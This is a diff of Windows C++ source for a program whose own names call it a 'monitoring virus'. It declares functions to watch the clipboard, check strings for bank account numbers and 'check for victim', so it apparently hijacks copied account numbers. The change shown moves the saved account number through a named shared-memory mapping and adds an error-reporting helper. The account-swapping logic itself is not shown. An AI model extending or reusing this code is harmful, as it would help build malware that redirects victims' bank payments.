@@ -12,6 +12,7 @@ void MoveToCb();
 bool CheckIfAccountNumber(LPSTR str);
 void CheckForVictim();
 void SaveNumber(LONG_PTR num);
+void GLEMAS();
 
 constexpr CHAR szClassName[] = "WirusMonitorujacy";
 LPSTR bankAccount;
@@ -188,11 +189,31 @@ bool CheckIfAccountNumber(LPSTR str)
 
 void SaveNumber(LONG_PTR num)
 {
-	//bankAccount = (LPSTR)calloc(MAXL + 1, sizeof(CHAR));
-	//LPSTR lpGlobalMem = LPSTR(GlobalLock(HGLOBAL(num)));
-	//memcpy(bankAccount, lpGlobalMem, MAXL + 1); // BŁĄD!!!!
-	//GlobalFree(HGLOBAL(num));
-	LPSTR lpGlobalMem = LPSTR(num);
-	memcpy(bankAccount, lpGlobalMem, MAXL + 1); // BŁĄD!!!!
-	GlobalFree(HGLOBAL(num));
+	HANDLE hMem = OpenFileMapping(
+		FILE_MAP_ALL_ACCESS,
+		FALSE,
+		"Global\\FM_V"
+	);
+	if (hMem == NULL) GLEMAS();
+	LPCTSTR pBuf = (LPTSTR)MapViewOfFile(
+		hMem,
+		FILE_MAP_ALL_ACCESS,
+		0,
+		0,
+		MAXL + 1
+	);
+	if (pBuf == NULL) GLEMAS();
+	CopyMemory(bankAccount, (PVOID)pBuf, (MAXL + 1) * sizeof(CHAR));
+
+	UnmapViewOfFile(pBuf);
+	CloseHandle(hMem);
+}
+
+void GLEMAS()
+{
+	wchar_t buf[256];
+	FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+		NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+		buf, (sizeof(buf) / sizeof(wchar_t)), NULL);
+	int i = 0;
 }
